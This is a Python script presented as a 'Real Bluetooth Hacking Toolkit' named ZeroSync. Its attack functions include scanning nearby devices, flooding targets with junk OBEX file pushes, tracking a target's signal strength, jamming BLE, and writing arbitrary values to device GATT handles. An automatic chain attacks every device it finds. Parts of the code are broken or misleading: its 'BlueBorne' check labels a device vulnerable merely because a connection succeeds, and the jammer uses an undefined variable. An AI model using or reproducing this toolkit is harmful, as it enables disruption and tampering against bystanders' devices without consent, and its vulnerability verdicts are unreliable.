
#!/usr/bin/env python3
# ZeroSync v3.6 - Real Bluetooth Hacking Toolkit (No placeholders)

import os
import time
import threading
import subprocess
from sys import exit
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table

# Bluetooth safety wrapper
try:
    from bluetooth import discover_devices, BluetoothSocket, L2CAP
except Exception as e:
    print("❌ Bluetooth support not available:", e)
    exit(1)

console = Console()
scanned_devices = []
scan_stop_flag = False
scan_thread = None

def scan_devices():
    global scanned_devices, scan_stop_flag
    scanned_devices = []
    scan_stop_flag = False
    console.print(Panel("Scanning for Bluetooth devices...", style="bold cyan"))
    try:
        nearby_devices = discover_devices(duration=10, lookup_names=True)
        for addr, name in nearby_devices:
            if scan_stop_flag:
                break
            scanned_devices.append((addr, name))
            console.print(f"[green]Found:[/green] {name} ({addr})")
        if not scan_stop_flag:
            console.print(Panel(f"Scan complete. Found {len(scanned_devices)} device(s).", style="green"))
    except Exception as e:
        console.print(f"[red]Scan error:[/red] {e}")

def start_scan_thread():
    global scan_thread
    scan_thread = threading.Thread(target=scan_devices)
    scan_thread.start()

def stop_scan():
    global scan_stop_flag
    scan_stop_flag = True
    console.print(Panel("Scan stopped.", style="red"))

def show_scanned_devices():
    if not scanned_devices:
        console.print("[yellow]No devices scanned yet.[/yellow]")
        return
    table = Table(title="Scanned Devices")
    table.add_column("Index", style="bold")
    table.add_column("MAC Address", style="cyan")
    table.add_column("Name", style="magenta")
    for i, (addr, name) in enumerate(scanned_devices):
        table.add_row(str(i), addr, name)
    console.print(table)

def select_device():
    show_scanned_devices()
    idx = Prompt.ask("Enter device index", default="0")
    try:
        idx = int(idx)
        return scanned_devices[idx][0]
    except:
        console.print("[red]Invalid selection[/red]")
        return None

def blueborne_scanner():
    console.print(Panel("BlueBorne Scanner (CVE-2017-0785)", style="bold magenta"))
    for addr, name in scanned_devices:
        try:
            sock = BluetoothSocket(L2CAP)
            sock.settimeout(3)
            sock.connect((addr, 0x1001))  # ATT channel
            console.print(f"[red]VULNERABLE:[/red] {name} ({addr})")
            sock.close()
        except:
            console.print(f"[green]Secure:[/green] {name} ({addr})")

def obex_file_bomb(target_mac):
    console.print(Panel(f"Launching OBEX file bomb on {target_mac}", style="bold red"))
    junk_file = "/tmp/zerosync_junk.txt"
    with open(junk_file, "w") as f:
        f.write("ZEROSYNCBOMB" * 10000)
    for i in range(5):
        os.system(f"obexftp --nopath --noconn --uuid none --bluetooth {target_mac} --channel 9 -p {junk_file}")
        console.print(f"[yellow]Bomb file {i+1} sent.[/yellow]")
    console.print("[green]OBEX bombing complete.[/green]")

def signal_strength_tracker(target_mac):
    console.print(Panel(f"Tracking RSSI of {target_mac}", style="cyan"))
    for i in range(10):
        try:
            rssi = subprocess.check_output(f"hcitool rssi {target_mac}", shell=True, text=True).strip()
            console.print(f"[blue]{rssi}[/blue]")
        except:
            console.print("[red]RSSI read failed[/red]")
        time.sleep(2)

def bettercap_bridge():
    command = Prompt.ask("Enter Bettercap BLE command")
    try:
        result = subprocess.check_output(["sudo", "bettercap", "-eval", command], stderr=subprocess.STDOUT, text=True)
        console.print(result)
    except subprocess.CalledProcessError as e:
        console.print(f"[red]Bettercap error:[/red] {e.output}")


def bettercap_ble_attack():
    console.print(Panel("Launching Bettercap BLE Recon", style="bold cyan"))
    try:
        script = "ble.recon on; ble.scan on; sleep 10; ble.show"
        result = subprocess.check_output(["sudo", "bettercap", "-eval", script], stderr=subprocess.STDOUT, text=True)
        console.print(result)
    except subprocess.CalledProcessError as e:
        console.print(f"[red]Bettercap BLE error:[/red] {e.output}")

def auto_attack_chain():
    console.print(Panel("Starting Auto Attack Chain", style="bold red"))
    start_scan_thread()
    time.sleep(12)
    stop_scan()
    if not scanned_devices:
        console.print("[yellow]No devices found. Aborting chain.[/yellow]")
        return

    show_scanned_devices()
    for addr, name in scanned_devices:
        console.print(Panel(f"Attacking {name} ({addr})", style="red"))
        try:
            sock = BluetoothSocket(L2CAP)
            sock.settimeout(3)
            sock.connect((addr, 0x1001))
            console.print(f"[red]BlueBorne: VULNERABLE[/red] - {name} ({addr})")
            sock.close()
        except:
            console.print(f"[green]BlueBorne: Secure[/green] - {name} ({addr})")

        # OBEX bomb
        try:
            junk_file = "/tmp/zerosync_autobomb.txt"
            with open(junk_file, "w") as f:
                f.write("ZEROSYNCCHAIN" * 10000)
            os.system(f"obexftp --nopath --noconn --uuid none --bluetooth {addr} --channel 9 -p {junk_file}")
            console.print("[yellow]OBEX Bomb sent[/yellow]")
        except:
            console.print("[red]OBEX bomb failed[/red]")

        # RSSI
        try:
            rssi = subprocess.check_output(f"hcitool rssi {addr}", shell=True, text=True).strip()
            console.print(f"[blue]RSSI: {rssi}[/blue]")
        except:
            console.print("[red]RSSI read failed[/red]")

    console.print("[green]Auto attack chain complete.[/green]")

def launch_btlejack_jammer():
    console.print(Panel("Launching BLE Jammer (btlejack)...", style="bold red"))
    try:
        result = subprocess.check_output(["btlejack", "-j"], stderr=subprocess.STDOUT, text=True)
        console.print(result)
        script = f"ble.recon on; ble.scan on; sleep 5; ble.connect {target}; sleep 3; ble.gatt.read; ble.gatt.write 0x0003 0xFF"
        result = subprocess.check_output(["sudo", "bettercap", "-eval", script], stderr=subprocess.STDOUT, text=True)
        console.print(result)
    except subprocess.CalledProcessError as e:
        console.print(f"[red]Bettercap GATT error:[/red] {e.output}")

def bettercap_gatt_inject():
    target = select_device()
    if not target:
        return
    console.print(Panel(f"Injecting via Bettercap on {target}", style="bold magenta"))
    try:
        script = f"ble.recon on; ble.scan on; sleep 5; ble.connect {target}; sleep 3; ble.gatt.read; ble.gatt.write 0x0003 0xFF"
        result = subprocess.check_output(["sudo", "bettercap", "-eval", script], stderr=subprocess.STDOUT, text=True)
        console.print(result)
    except subprocess.CalledProcessError as e:
        console.print(f"[red]Bettercap GATT error:[/red] {e.output}")
